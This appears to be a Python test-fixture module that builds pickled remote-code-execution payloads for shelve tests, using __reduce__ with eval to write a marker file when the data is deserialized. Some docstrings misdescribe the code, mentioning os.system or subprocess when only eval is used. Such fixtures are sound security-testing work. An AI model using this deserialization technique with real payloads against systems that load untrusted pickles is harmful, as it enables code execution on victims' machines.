"""RCE payloads for shelve tests."""
import pickle
from types import SimpleNamespace


def rce_via_reduce_shelve(marker_path: str) -> bytes:
    """Create a pickled payload that executes when deserialized.
    
    The payload uses __reduce__ to trigger __import__('os').system() which
    creates a marker file to prove RCE.
    """
    class RCEPayload:
        def __reduce__(self):
            return (
                eval,
                (
                    '__import__("builtins").open(r"{}", "w").write("RCE_MARKER")'.format(marker_path),
                )
            )
    
    return pickle.dumps(RCEPayload(), protocol=5)


def rce_simple_marker(marker_path: str) -> bytes:
    """Simpler RCE payload using subprocess."""
    class SimpleMarker:
        def __reduce__(self):
            return (
                eval,
                (
                    'open(r"{}", "w").write("RCE_MARKER")'.format(marker_path),
                )
            )
    
    return pickle.dumps(SimpleMarker(), protocol=5)